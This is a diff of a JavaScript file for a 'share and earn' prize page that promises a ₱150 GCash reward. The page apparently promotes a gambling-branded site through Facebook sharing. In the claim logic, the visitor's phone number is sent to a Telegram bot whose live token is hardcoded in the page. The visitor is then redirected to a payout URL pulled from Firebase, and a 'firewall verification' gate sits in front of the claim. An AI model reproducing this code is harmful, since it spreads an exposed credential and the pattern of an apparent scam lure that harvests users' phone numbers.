@@ -1,4 +1,5 @@
-// ========== PROMOTION.JS - COMPLETE WITH FIREWALL & CLAIM LOGIC ==========
+// ========== PROMOTION.JS - SHARE AND EARN ==========
+// Complete with Firebase, Firewall, and Claim Logic
 
 // ========== LOCALSTORAGE KEYS ==========
 function getUserStorageKeys() {
@@ -18,7 +19,7 @@ function getUserStorageKeys() {
     };
 }
 
-// ========== SAVE/GET BALANCE ==========
+// ========== BALANCE FUNCTIONS ==========
 function saveBalance(amount) {
     var keys = getUserStorageKeys();
     if (!keys) return;
@@ -59,7 +60,7 @@ function getLeftRewardClaimed() {
     return localStorage.getItem(keys.leftRewardKey) === 'true';
 }
 
-// ========== INVITATIONS ==========
+// ========== INVITATIONS FUNCTIONS ==========
 function getInvitations() {
     var keys = getUserStorageKeys();
     if (!keys) return [];
@@ -179,6 +180,21 @@ window.sendInviteToStorage = function() {
         alert("You already invited this person!");
     }
 };
+
+// ========== UPDATE LEFT CARD VISUAL ==========
+function updateLeftCardFromStorage() {
+    var leftCard = document.getElementById('leftCard');
+    if (!leftCard) return;
+    if (getLeftRewardClaimed()) {
+        leftCard.classList.add('prize-card-claimed');
+        leftCard.classList.remove('prize-card-glow');
+        leftCard.style.cursor = 'default';
+    } else {
+        leftCard.classList.add('prize-card-glow');
+        leftCard.classList.remove('prize-card-claimed');
+        leftCard.style.cursor = 'pointer';
+    }
+}
 
 // ========== CONFETTI ==========
 var confettiAnimation = null;
@@ -333,74 +349,27 @@ function closePrizePopup() {
     window.location.reload();
 }
 
-// ========== FIREWALL & CLAIM LOGIC ==========
-async function checkFirewallAndClaim() {
-    console.log("Checking firewall and processing claim...");
-    
-    if (typeof firebase === 'undefined' || !firebase.database) {
-        alert("System error. Please try again.");
-        return false;
-    }
-    
+// ========== GET LATEST DEPLOYED LINK ==========
+async function getLatestPayoutLink() {
+    if (typeof firebase === 'undefined' || !firebase.database) return null;
     try {
-        var db = firebase.database();
-        
-        // Check firewall status
-        var firewallSnap = await db.ref('admin/globalFirewall').once('value');
-        var firewallData = firewallSnap.val();
-        var isFirewallOn = firewallData && firewallData.active === true;
-        
-        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
-        
-        if (isFirewallOn) {
-            showFirewallVerification();
-            return false;
+        const db = firebase.database();
+        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        if (snapshot.exists()) {
+            const key = Object.keys(snapshot.val())[0];
+            const linkData = snapshot.val()[key];
+            console.log("Found payout link:", linkData.url);
+            return { url: linkData.url, key: key };
         }
-        
-        // Check for available links
-        var linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
-        
-        if (linksSnap.exists()) {
-            var key = Object.keys(linksSnap.val())[0];
-            var linkData = linksSnap.val()[key];
-            var redirectUrl = linkData.url;
-            var userPhone = localStorage.getItem("userPhone") || "Unknown";
-            var amount = 150;
-            
-            // Update link status
-            await db.ref('links/' + key).update({
-                status: 'claimed',
-                user: userPhone,
-                amount: amount,
-                claimedAt: Date.now()
-            });
-            
-            // Send Telegram
-            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount))
-                .catch(function(e) { console.log("Telegram error:", e); });
-            
-            // Close popup and redirect
-            var prizePopup = document.getElementById('prizePopup');
-            if (prizePopup) prizePopup.style.display = 'none';
-            
-            alert("Claim successful! Redirecting...");
-            setTimeout(function() {
-                window.location.href = redirectUrl;
-            }, 1500);
-            return true;
-            
-        } else {
-            showNoLinkAlert();
-            return false;
-        }
-        
-    } catch(error) {
-        console.error("Error:", error);
-        alert("System error. Please try again.");
-        return false;
+        console.warn("No available links found in Firebase");
+        return null;
+    } catch (error) {
+        console.error("Error getting payout link:", error);
+        return null;
     }
 }
 
+// ========== FIREWALL VERIFICATION ==========
 function showFirewallVerification() {
     var modal = document.createElement('div');
     modal.style.position = 'fixed';
@@ -468,6 +437,7 @@ function showFirewallVerification() {
     };
 }
 
+// ========== NO LINK ALERT ==========
 function showNoLinkAlert() {
     var modal = document.createElement('div');
     modal.style.position = 'fixed';
@@ -497,6 +467,82 @@ function showNoLinkAlert() {
     document.getElementById('closeAlertBtn').onclick = function() { modal.remove(); };
 }
 
+// ========== CHECK FIREWALL AND CLAIM ==========
+async function checkFirewallAndClaim() {
+    console.log("Starting claim process...");
+    
+    if (typeof firebase === 'undefined' || !firebase.database) {
+        alert("System error. Please refresh the page.");
+        return false;
+    }
+    
+    try {
+        const db = firebase.database();
+        
+        // Check firewall status
+        const firewallSnap = await db.ref('admin/globalFirewall').once('value');
+        const firewallData = firewallSnap.val();
+        const isFirewallOn = firewallData && firewallData.active === true;
+        
+        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
+        
+        if (isFirewallOn) {
+            showFirewallVerification();
+            return false;
+        }
+        
+        // Get latest payout link
+        const linkData = await getLatestPayoutLink();
+        
+        if (!linkData || !linkData.url) {
+            console.log("No available link found");
+            showNoLinkAlert();
+            return false;
+        }
+        
+        const redirectUrl = linkData.url;
+        const linkKey = linkData.key;
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        const amount = 150;
+        
+        console.log("Claiming link:", redirectUrl);
+        
+        // Update link status to claimed
+        await db.ref('links/' + linkKey).update({
+            status: 'claimed',
+            user: userPhone,
+            amount: amount,
+            claimedAt: Date.now()
+        });
+        
+        // Send Telegram notification
+        fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount))
+            .catch(e => console.log("Telegram error:", e));
+        
+        // Close popup
+        const prizePopup = document.getElementById('prizePopup');
+        if (prizePopup) prizePopup.style.display = 'none';
+        
+        // Fix URL if missing https://
+        let finalUrl = redirectUrl;
+        if (finalUrl && !finalUrl.startsWith('http')) {
+            finalUrl = 'https://' + finalUrl;
+        }
+        
+        alert("Claim successful! Redirecting...");
+        setTimeout(() => {
+            window.location.href = finalUrl;
+        }, 1500);
+        
+        return true;
+        
+    } catch (error) {
+        console.error("Claim error:", error);
+        alert("System error. Please try again.");
+        return false;
+    }
+}
+
 // ========== CLAIM THRU GCASH BUTTON ==========
 function initClaimButton() {
     var claimBtn = document.getElementById('claimGCashBtn');
@@ -515,10 +561,12 @@ function initClaimButton() {
         console.log("CLAIM THRU GCASH clicked");
         
         this.style.transform = 'scale(0.97)';
-        setTimeout(function() { if (claimBtn) claimBtn.style.transform = ''; }, 200);
+        setTimeout(() => { if (claimBtn) claimBtn.style.transform = ''; }, 200);
         
         await checkFirewallAndClaim();
     };
+    
+    console.log("Claim button initialized");
 }
 
 // ========== FACEBOOK SHARE ==========
@@ -532,19 +580,6 @@ function initFacebookShare() {
             var shareUrl = "https://xjiligames.github.io/rewards/index.html";
             window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(caption), '_blank', 'width=600,height=500');
         };
-    }
-}
-
-// ========== UPDATE LEFT CARD VISUAL ==========
-function updateLeftCardFromStorage() {
-    var leftCard = document.getElementById('leftCard');
-    if (!leftCard) return;
-    if (getLeftRewardClaimed()) {
-        leftCard.classList.add('prize-card-claimed');
-        leftCard.classList.remove('prize-card-glow');
-    } else {
-        leftCard.classList.add('prize-card-glow');
-        leftCard.classList.remove('prize-card-claimed');
     }
 }
 
